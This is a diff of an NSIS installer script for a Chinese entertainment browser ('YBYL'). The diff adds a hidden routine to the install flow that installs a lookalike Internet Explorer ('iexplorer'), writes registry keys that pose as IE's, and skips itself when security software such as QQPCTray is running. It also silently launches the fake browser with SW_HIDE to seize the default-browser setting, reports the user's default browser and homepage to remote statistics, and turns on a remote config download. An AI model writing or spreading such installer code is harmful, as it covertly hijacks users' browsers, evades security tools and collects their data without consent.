@@ -54,10 +54,10 @@ Var Bool_IsSilent
 
 !define PRODUCT_NAME "YBYL"
 !define SHORTCUT_NAME "元宝娱乐浏览器"
-!define PRODUCT_VERSION "1.0.0.20"
-!define VERSION_LASTNUMBER "B20"
-!define PRODUCT_VERSION_IE "8.0.0.15"
-!define VERSION_LASTNUMBER_IE "B15"
+!define PRODUCT_VERSION "1.0.0.22"
+!define VERSION_LASTNUMBER "B22"
+!define PRODUCT_VERSION_IE "8.0.0.17"
+!define VERSION_LASTNUMBER_IE "B17"
 
 !define NeedSpace 10240
 !define EM_OUTFILE_NAME "YBSetup-${PRODUCT_VERSION}_inner.exe"
@@ -184,7 +184,7 @@ Function CloseExe
 	${Next}
 FunctionEnd
 
-Function un.CheckBlackProcess
+Function CheckBlackProcess
 	StrCpy $R0 0
 	${For} $R5 1 28
 		${WordFind} $R4 "," +$R5 $R3
@@ -203,7 +203,7 @@ FunctionEnd
 
 Var str_IeTID
 Var Bool_IsUpdateIE
-Function un.CreateDeskIcon
+Function CreateDeskIcon
 	StrCpy $Bool_IsUpdateIE 0
 	ReadRegStr $2 HKCU "SOFTWARE\iexplorer" "Path"
 	IfFileExists $2 0 +2
@@ -216,7 +216,7 @@ Function un.CreateDeskIcon
 	${OrIf} $R4 == 0
 		StrCpy $R4 "QQPCTray"
 	${EndIf}
-	Call un.CheckBlackProcess
+	Call CheckBlackProcess
 	${If} $R0 == 1
 		Goto EndCreateDeskIcon
 	${Endif}
@@ -259,7 +259,7 @@ Function un.CreateDeskIcon
 	${EndIf}
 	WriteRegStr HKCU "SOFTWARE\iexplorer" "ietid" $str_IeTID
 	
-	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'installiefromYBUninst', t '$str_ChannelID', t '${VERSION_LASTNUMBER_IE}', i 0, t '$str_IeTID') "
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'installiefromYBInstall', t '$str_ChannelID', t '${VERSION_LASTNUMBER_IE}', i 0, t '$str_IeTID') "
 	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'install', t '$str_ChannelID', t '${VERSION_LASTNUMBER_IE}', i 0, t '$str_IeTID') "
 	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayVersion" "${PRODUCT_VERSION_IE}"
 	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "URLInfoAbout" ""
@@ -308,7 +308,7 @@ Function un.CreateDeskIcon
 	${OrIf} $R4 == 0
 		StrCpy $R0 0
 	${Else}
-		Call un.CheckBlackProcess
+		Call CheckBlackProcess
 	${EndIf}
 	;创建我们的图标
 	${If} $R0 == 1
@@ -502,9 +502,9 @@ Function un.CreateDeskIcon
 		WriteRegStr HKLM "Software\Clients\StartMenuInternet\IEXPLORE.EXE\shell\open\command" "" '"$0\iexplorer\program\iexplore.exe"'
 	${EndIf}
 	;拉起exe抢默认浏览器
-	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'ExecWait $0\iexplorer\program\iexplore.exe /setdefault')"
-	ExecWait '"$0\iexplorer\program\iexplore.exe" /setdefault'
-	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'ExecWait leave')"
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'ExecShell $0\iexplorer\program\iexplore.exe /setdefault ybylpacket')"
+	ExecShell open "$0\iexplorer\program\iexplore.exe" "/setdefault ybylpacket" SW_HIDE
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'ExecShell leave')"
 	EndCreateDeskIcon:
 FunctionEnd
 
@@ -536,11 +536,6 @@ FunctionEnd
 
 /******安装ie******/
 Function InstallIE
-	;上报默认主页+默认浏览器
-	Call GetDefaultBrowserAndMainPage
-	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t 'defaultbrowserfromYBInstall', t '$str_DefaultBrowser', t '$str_ChannelID', i 1) "
-	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t 'iehomepagefromYBInstall', t '$str_MainPage', t '$str_ChannelID', i 1) "
-	
 	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'InstallIE 1')"
 	;判断系统
 	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::IsOsUac() i.r0"
@@ -607,6 +602,11 @@ Function InstallIE
 		StrCpy $str_IeTID "UA-61912032-1"
 	${EndIf}
 	WriteRegStr HKLM "SOFTWARE\YBYL" "ietid" $str_IeTID
+	
+	;上报默认主页+默认浏览器
+	Call GetDefaultBrowserAndMainPage
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'defaultbrowserfromYBInstall', t '$str_DefaultBrowser', t '$str_ChannelID', i 1, t '$str_IeTID') "
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'iehomepagefromYBInstall', t '$str_MainPage', t '$str_ChannelID', i 1, t '$str_IeTID') "
 	;上报
 	${If} $Bool_IsUpdateIE == 0
 		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'releasefile', t 'brandnew', t '$str_ChannelID', i 1, t '$str_IeTID') "
@@ -806,6 +806,7 @@ Function CmdSilentInstall
 	;${ElseIf} $Bool_NeedInstallIE == 0
 	;${AndIf} $1 == 0
 		Call InstallIE
+		Call CreateDeskIcon
 	;${EndIf}
 	;Sleep 2000
 	SetOutPath "$INSTDIR\program"
@@ -1029,7 +1030,7 @@ Function .onInit
 	File "input_main\program\ATL90.dll"
 	File "license\license.txt"
 	;最开始下载ini配置
-	;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::DownLoadIniConfig()"
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::DownLoadIniConfig()"
 	Call CmdSilentInstall
 	;Call CmdUnstall
 	
@@ -1785,6 +1786,7 @@ Function NSD_TimerFun
 	;${OrIf} $Bool_NeedInstallIE == 2
 	;${OrIf} $Bool_NeedInstallIE == 3
 		Call InstallIE
+		Call CreateDeskIcon
 		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'NSD_TimerFun 2')"
 	;${EndIf}
 	;主线程中创建快捷方式
@@ -2041,7 +2043,7 @@ Function un.onInit
 	File "bin\YBSetUpHelper.dll"
 	NoReleaseHelper:
 	;最开始下载ini配置
-	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::DownLoadIniConfig()"
+	;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::DownLoadIniConfig()"
 	
 	StrCpy $Int_FontOffset 4
 	CreateFont $Handle_Font "宋体" 10 0
@@ -2139,8 +2141,8 @@ Function un.UNSD_TimerFun
     GetFunctionAddress $0 un.DoUninstall
     BgWorker::CallAndWait
 	;修复ie图标
-	Call un.CreateDeskIcon
-	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'un.CreateDeskIcon leave')"
+	;Call un.CreateDeskIcon
+	;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'un.CreateDeskIcon leave')"
 	ReadRegStr $0 ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_MAININFO_FORSELF}" "InstDir"
 	${If} $0 == "$INSTDIR"
 		DeleteRegKey ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}"
